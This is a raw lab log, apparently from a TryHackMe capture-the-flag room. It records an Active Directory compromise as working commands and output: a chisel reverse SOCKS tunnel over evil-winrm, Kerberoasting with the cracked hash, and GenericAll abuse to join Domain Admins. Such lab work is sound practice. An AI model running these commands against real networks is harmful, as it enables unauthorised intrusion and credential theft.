root@ip-10-114-66-144:~# nmap -sV -sC 10.200.150.10
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-04 07:59 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.200.150.10
Host is up (0.021s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
53/tcp open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/4%Time=69A7E682%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.16 seconds
root@ip-10-114-66-144:~# 


i have tried several nmap configuratoins but firewall is blocking it

chisel server -p 9999 --reverse
cp /usr/local/bin/chisel /root/Desktop/chisel
evil-winrm -i 10.200.150.20 -u John -p 'VerySafePassword!' -e /usr/local/bin/
upload chisel

ip addr
8: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.250.1.6/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::af9f:9086:f4c:d9c0/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
root@ip-10-113-96-208:~/Desktop# 

.\chisel client 10.250.1.6:9999 R:socks 
Program 'chisel' failed to run: Access is deniedAt line:1 char:1
+ .\chisel client 10.250.1.6:9999 R:socks
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\chisel client 10.250.1.6:9999 R:socks
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed



wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
evil-winrm -i 10.200.150.20 -u John -p 'VerySafePassword!' -e /usr/local/bin/
upload chisel.exe

.\chisel.exe client 10.250.1.6:9999 R:socks
s> .\chisel.exe client 10.250.1.6:9999 R:socks
Program 'chisel.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
+ .\chisel.exe client 10.250.1.6:9999 R:socks
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\chisel.exe client 10.250.1.6:9999 R:socks
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\john\Documents> 


conclusion wrong architecture not 32-ARM but 64
:\Users\john\Documents> [Environment]::Is64BitOperatingSystem
True
*Evil-WinRM* PS C:\Users\john\Documents>


wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_amd64.gz
gunzip chisel_1.8.1_windows_amd64.gz
mv chisel_1.8.1_windows_amd64 chisel.exe

upload chisel.exe
 C:\Users\john\Documents> .\chisel.exe client 10.250.1.6:9999 R:socks

now in the tunnel


root@ip-10-113-96-208:~# find / -name "proxychains*" 2>/dev/null
/var/lib/dpkg/info/proxychains.list
/var/lib/dpkg/info/proxychains.conffiles
/var/lib/dpkg/info/proxychains.md5sums
/var/lib/dpkg/info/proxychains.postinst
/var/lib/dpkg/info/proxychains.prerm
/var/lib/dpkg/alternatives/proxychains
/usr/lib/proxychains3
/usr/bin/proxychains3
/usr/bin/proxychains
/usr/share/man/man1/proxychains.1.gz
/usr/share/man/man1/proxychains3.1.gz
/usr/share/doc/proxychains
/etc/alternatives/proxychains.1.gz
/etc/alternatives/proxychains
/etc/proxychains.conf
root@ip-10-113-96-208:~# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050

root@ip-10-113-96-208:~# 

echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
sed -i '/socks4.*9050/d' /etc/proxychains.conf




nmap !!!
root@ip-10-113-96-208:~# proxychains nmap -sT -Pn -p 53,88,135,389,445,5985 10.200.150.10
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-04 09:15 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:53-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:389-<><>-OK
Nmap scan report for 10.200.150.10
Host is up (0.068s latency).

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
root@ip-10-113-96-208:~# 


root@ip-10-113-96-208:~# proxychains smbclient -L //10.200.150.10 -U 'TRYHACKME\John%VerySafePassword!'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-<><>-OK

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
root@ip-10-113-96-208:~# 

root@ip-10-113-96-208:~# proxychains smbclient //10.200.150.10/SYSVOL -U 'TRYHACKME\John%VerySafePassword!'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-<><>-OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  2 16:12:59 2025
  ..                                  D        0  Wed Apr  2 16:12:59 2025
  tryhackme.loc                      Dr        0  Wed Apr  2 16:12:59 2025

		7863807 blocks of size 4096. 3430378 blocks available
smb: \> 

lets switch to blodgound
running bloodhund i found out that i miss DNS server so i used the server as one 
echo "nameserver 10.200.150.10" > /etc/resolv.conf

root@ip-10-113-96-208:~# cat /etc/resolv.conf 
cat: /etc/resolv.conf: No such file or directory
root@ip-10-113-96-208:~# ln -sf /etc/resolv-dnsmasq /etc/resolv.conf
root@ip-10-113-96-208:~# echo "nameserver 10.200.150.10" >> /etc/resolv-dnsmasq
root@ip-10-113-96-208:~# cat /etc/resolv-dnsmasq
nameserver 169.254.169.253
nameserver 10.200.150.10
root@ip-10-113-96-208:~# 


root@ip-10-113-96-208:~# proxychains bloodhound-python -u John -p 'VerySafePassword!' -d tryhackme.loc -ns 10.200.150.10 -c all
ProxyChains-3.1 (http://proxychains.sf.net)
INFO: Found AD domain: tryhackme.loc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (tryhackme.loc:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.tryhackme.loc
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:389-<><>-OK
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.tryhackme.loc
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:389-<><>-OK
INFO: Found 112 users
INFO: Found 57 groups
INFO: Found 3 gpos
INFO: Found 14 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WRK.tryhackme.loc
INFO: Querying computer: DC.tryhackme.loc
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.20:445-<><>-OK
<><>-OK
INFO: Done in 00M 07S
root@ip-10-113-96-208:~# 

ls -la *.json

root@ip-10-113-96-208:~# proxychains impacket-GetUserSPNs tryhackme.loc/John:'VerySafePassword!' -dc-ip 10.200.150.10 -request
ProxyChains-3.1 (http://proxychains.sf.net)
/usr/bin/proxychains: 9: exec: impacket-GetUserSPNs: not found
root@ip-10-113-96-208:~# find / -name "GetUserSPNs*" 2>/dev/null
/root/.cache/uv/archive-v0/N6wsrbpqj2HXO4dfWyZYf/impacket-0.13.0.dev0+20250527.165759.abfaea2b.data/scripts/GetUserSPNs.py
/root/.cache/uv/git-v0/checkouts/eacb5216d92e15c2/abfaea2b/build/scripts-3.13/GetUserSPNs.py
/root/.cache/uv/git-v0/checkouts/eacb5216d92e15c2/abfaea2b/examples/GetUserSPNs.py
/root/.pyenv/shims/GetUserSPNs.py
/root/.pyenv/versions/3.11.3/bin/GetUserSPNs.py
/root/.local/share/uv/tools/netexec/bin/GetUserSPNs.py
/root/Rooms/CVE2022-26923/certipy/lib/python3.9/site-packages/impacket-0.10.1.dev1-py3.9.egg/EGG-INFO/scripts/GetUserSPNs.py
/root/Rooms/CVE2022-26923/certipy/bin/GetUserSPNs.py
/root/Rooms/CVE2022-26923/impacket-master/build/scripts-3.9/GetUserSPNs.py
/root/Rooms/CVE2022-26923/impacket-master/examples/GetUserSPNs.py
/snap/crackmapexec/275/bin/GetUserSPNs.py
/snap/crackmapexec/275/bin/__pycache__/GetUserSPNs.cpython-310.pyc
/opt/impacket-old/examples/GetUserSPNs.py
/opt/impacket/build/scripts-3.9/GetUserSPNs.py
/opt/impacket/build/scripts-3.8/GetUserSPNs.py
/opt/impacket/examples/GetUserSPNs.py
/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/EGG-INFO/scripts/GetUserSPNs.py
/usr/local/lib/python3.6/dist-packages/impacket-0.10.1.dev1+20220606.123812.ac35841f-py3.6.egg/EGG-INFO/scripts/GetUserSPNs.py
/usr/local/bin/__pycache__/GetUserSPNs.cpython-39.pyc
/usr/local/bin/__pycache__/GetUserSPNs.cpython-36.pyc
/usr/local/bin/GetUserSPNs.py
root@ip-10-113-96-208:~# 



root@ip-10-113-96-208:~# proxychains python3 /usr/local/bin/GetUserSPNs.py tryhackme.loc/John:'VerySafePassword!' -dc-ip 10.200.150.10 -request
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:389-<><>-OK
ServicePrincipalName    Name        MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  ----------  --------  --------------------------  --------------------------  ----------
HTTP/csm.tryhackme.loc  j.phillips            2025-04-18 00:07:31.644827  2025-04-18 16:39:51.776438             



[-] CCache file is not found. Skipping...
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:88-<><>-OK
$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$e687d46718e4609466620a613bd3cd3a$758eca29de44f2add3aad2ae5c714dbe90e860ec99acd3655b6ef52a908fef475ef38dcd97301f42d2c381bc3153accb9007ce40225c56cac85686e6fee881989f4ce93a66d173e88b31968211652b4cd60dac62edf8c908597577d8924dd2e072f13ad77a0bc0a9ce2242e54a308a4ec7c48235e33d966a396845f7a6d35498568b4a4f770363eb405d0eaa5cbad153fe787999ab419c25988e2f809764a0787a45919d8cf37db1b763641d98ba38a1704b278d7a693f0e46885dcf1ea0092c602d10ec116f7f958e37fffb1e8854d7f5ae1cd3877229e0f2ccbf3e7a22110beb754f4ef22eba7ef45ea4b0324e99d96e511a5a7fbcf634b7089b0c3ef7fc2d56825d9422562e17438f15d36832bbff94b64e955a78c38c92de86f74171af980b985b03cebcfade0f1071587aec1ab5bd3eb933221f2b6c53712e36c1e7c9fa423a09d2d9f999bae01c6969fcf7dfc58f0413dd05f7b41cd2b40deadb38bc291cacbfe1217a6e620704773f0a8490bd1d8e7e3fa6d758b097e6d355e38188cbf7fc2af1618c040cdc0a2588e3c6989904722248ff8bcb696b3cbc07607b2521d8fb68216d7524c47a87c4c0f5161a96f07b29167c070a1ac30784dcc101152314c4e261227ef878e5074a62ae2495293ff863e617db8e3cd820fc4c6e0270a153112bd24b48ecedc7149d020e4d7a693f4659db63eb551dddb5541898648ddf6e4290b3e336976d74a4ce61e865323994bf8b0f7f698aac365010e682510ec92c4de0d575e84f83fd037bcb6238eb0b19838e2f765597fcd0ac3c03cbdc8431541e927c5c1f657dc05d1632f072f906a434145a921a85779c54988d47784801375cfb577d1d6d284a5d9e3e36f76d06015a77a9b7696cf9e20e255086f483653032c4753c0385dce76447b499aa1522c93cd1e756537a10143159c8b041827d21cbf4f353db2ac07f5c3c83866d1699b286ca24f877cca9baa557bef86063e25bf5a65b67c250dddf4c088f74b353258faaba2963819c0da101e0e3e76224a176c2b14d56bb7adba4e1af60932bfcf81268a356b424a7e72e549987d17e94f711a9a88a6db6563a7c596c17af513e9a110503c671aa34200600cc76932014cfa0cc0b6c75e96b08d2fb4b0f2f1d3519144201ce7ce8e2451609c80b0aed157df21af503a779526ca45debcf095de6a940be8891d94cfc02c2dfe36414fab2becf70e81080c90a471ca345f9bb7a73ad4ba158998c309a4e89fd2e953eefaf74dbd0de94eeda7a901766949361f06c2b767ba94b58d9d6c0d8ddadace9286453a2201b7fa625d9
root@ip-10-113-96-208:~# 


python3 /usr/local/bin/GetUserSPNs.py tryhackme.loc/John:'VerySafePassword!' -dc-ip 10.200.150.10 -request -outputfile hash.txt 2>/dev/null
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

root@ip-10-113-96-208:~/Desktop# john --wordlist=/usr/share/wordlists/rockyou.txt ../hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (?)
1g 0:00:00:00 DONE (2026-03-04 09:31) 3.333g/s 134826p/s 134826c/s 134826C/s power12..521521
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
root@ip-10-113-96-208:~/Desktop# 

root@ip-10-113-96-208:~# proxychains python3 /usr/local/bin/GetUserSPNs.py tryhackme.loc/j.phillips:'Welcome1' -dc-ip 10.200.150.10
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:389-<><>-OK
ServicePrincipalName    Name        MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  ----------  --------  --------------------------  --------------------------  ----------
HTTP/csm.tryhackme.loc  j.phillips            2025-04-18 00:07:31.644827  2026-03-04 09:34:25.196867             


root@ip-10-113-96-208:~# cat /root/20260304092301_users.json | python3 -c "import json,sys; data=json.load(sys.stdin); [print(u['Properties']['name'], u['Properties'].get('admincount','')) for u in data['data']]" 2>/dev/null | head -30
NT AUTHORITY@TRYHACKME.LOC 
C.TAYLOR@TRYHACKME.LOC False
B.HUGHES@TRYHACKME.LOC False
K.ROBERTS@TRYHACKME.LOC False
S.FROST@TRYHACKME.LOC False
D.HUNT@TRYHACKME.LOC False
O.KNOWLES@TRYHACKME.LOC False
M.BURROWS@TRYHACKME.LOC False
M.TAYLOR@TRYHACKME.LOC False
V.ADAMS@TRYHACKME.LOC False
O.MORTON@TRYHACKME.LOC False
J.HUTCHINSON@TRYHACKME.LOC False
J.GARDNER@TRYHACKME.LOC False
G.PRICE@TRYHACKME.LOC False
H.PHILLIPS@TRYHACKME.LOC False
J.BEGUM@TRYHACKME.LOC False
B.ANDERSON@TRYHACKME.LOC False
J.JOHNSON@TRYHACKME.LOC False
S.MITCHELL@TRYHACKME.LOC False
N.MARSH@TRYHACKME.LOC False
A.JACKSON@TRYHACKME.LOC False
N.CHANDLER@TRYHACKME.LOC False
D.DAVIES1@TRYHACKME.LOC False
D.SMITH@TRYHACKME.LOC False
B.HARRISON@TRYHACKME.LOC False
A.FIELD@TRYHACKME.LOC False
D.RHODES@TRYHACKME.LOC False
P.OSBORNE@TRYHACKME.LOC False
T.HOOPER@TRYHACKME.LOC False
F.HENRY@TRYHACKME.LOC False
root@ip-10-113-96-208:~# 


root@ip-10-113-96-208:~# cat /root/20260304092301_users.json | python3 -c "import json,sys; data=json.load(sys.stdin); [print(u['Properties']['name']) for u in data['data'] if u['Properties'].get('admincount')==True]"
G.DUNCAN@TRYHACKME.LOC
G.KNOWLES@TRYHACKME.LOC
KRBTGT@TRYHACKME.LOC
ADMINISTRATOR@TRYHACKME.LOC
root@ip-10-113-96-208:~# 

root@ip-10-113-96-208:~# cat /root/20260304092301_users.json | python3 -c "
> import json,sys
> data=json.load(sys.stdin)
> for u in data['data']:
>     if 'KNOWLES' in u['Properties']['name'].upper():
>         for ace in u['Aces']:
>             print(ace['RightName'], ace['PrincipalSID'])
> " 2>/dev/null
Owns S-1-5-21-1966530601-3185510712-10604624-512
GenericAll S-1-5-21-1966530601-3185510712-10604624-512
GenericAll TRYHACKME.LOC-S-1-5-32-548
AddKeyCredentialLink S-1-5-21-1966530601-3185510712-10604624-526
AddKeyCredentialLink S-1-5-21-1966530601-3185510712-10604624-527
GenericAll S-1-5-21-1966530601-3185510712-10604624-519
GenericWrite TRYHACKME.LOC-S-1-5-32-544
WriteOwner TRYHACKME.LOC-S-1-5-32-544
AllExtendedRights TRYHACKME.LOC-S-1-5-32-544
WriteDacl TRYHACKME.LOC-S-1-5-32-544
Owns S-1-5-21-1966530601-3185510712-10604624-512
GenericWrite S-1-5-21-1966530601-3185510712-10604624-512
WriteOwner S-1-5-21-1966530601-3185510712-10604624-512
AllExtendedRights S-1-5-21-1966530601-3185510712-10604624-512
WriteDacl S-1-5-21-1966530601-3185510712-10604624-512
GenericWrite S-1-5-21-1966530601-3185510712-10604624-519
WriteOwner S-1-5-21-1966530601-3185510712-10604624-519
AllExtendedRights S-1-5-21-1966530601-3185510712-10604624-519
WriteDacl S-1-5-21-1966530601-3185510712-10604624-519
GenericWrite TRYHACKME.LOC-S-1-5-32-544
WriteOwner TRYHACKME.LOC-S-1-5-32-544
AllExtendedRights TRYHACKME.LOC-S-1-5-32-544
WriteDacl TRYHACKME.LOC-S-1-5-32-544
root@ip-10-113-96-208:~# 


root@ip-10-113-96-208:~# cat /root/20260304092301_groups.json | python3 -c "
> import json,sys
> data=json.load(sys.stdin)
> for g in data['data']:
>     if 'DOMAIN ADMINS' in g['Properties']['name'].upper():
>         for ace in g['Aces']:
>             print(ace['RightName'], ace['PrincipalSID'])
> " 2>/dev/null
Owns S-1-5-21-1966530601-3185510712-10604624-512
GenericWrite S-1-5-21-1966530601-3185510712-10604624-512
WriteOwner S-1-5-21-1966530601-3185510712-10604624-512
WriteDacl S-1-5-21-1966530601-3185510712-10604624-512
GenericWrite S-1-5-21-1966530601-3185510712-10604624-519
WriteOwner S-1-5-21-1966530601-3185510712-10604624-519
WriteDacl S-1-5-21-1966530601-3185510712-10604624-519
GenericAll S-1-5-21-1966530601-3185510712-10604624-1187
GenericWrite TRYHACKME.LOC-S-1-5-32-544
WriteOwner TRYHACKME.LOC-S-1-5-32-544
WriteDacl TRYHACKME.LOC-S-1-5-32-544
root@ip-10-113-96-208:~# 
GenericAll S-1-5-21-...-1187 — that's j.phillips having GenericAll over Domain Admins group!
This means j.phillips can add any user directly to Domain Admins. Let's do it:

root@ip-10-113-96-208:~# proxychains net rpc group addmem "Domain Admins" "j.phillips" -U "tryhackme.loc/j.phillips%Welcome1" -S 10.200.150.10
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-<><>-OK
root@ip-10-113-96-208:~# 

root@ip-10-113-96-208:~# proxychains net rpc group members "Domain Admins" -U "tryhackme.loc/j.phillips%Welcome1" -S 10.200.150.10
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:445-<><>-OK
TRYHACKME\Administrator
TRYHACKME\g.duncan
TRYHACKME\j.phillips
root@ip-10-113-96-208:~#

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:/flag.txt
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:5985-<><>-OK
Access to the path 'C:\flag.txt' is denied.
At line:1 char:1
+ type C:/flag.txt
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "type C:\flag.txt"
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.150.10:5985-<><>-OK
cmd.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Content C:\flag.txt -Force



robocopy /B C:\ C:\Users\j.phillips\Documents flag.txt
type C:\Users\j.phillips\Documents\flag.txt

THM{10ace01a-82be-4da0-b67d-a2ce7561af33}
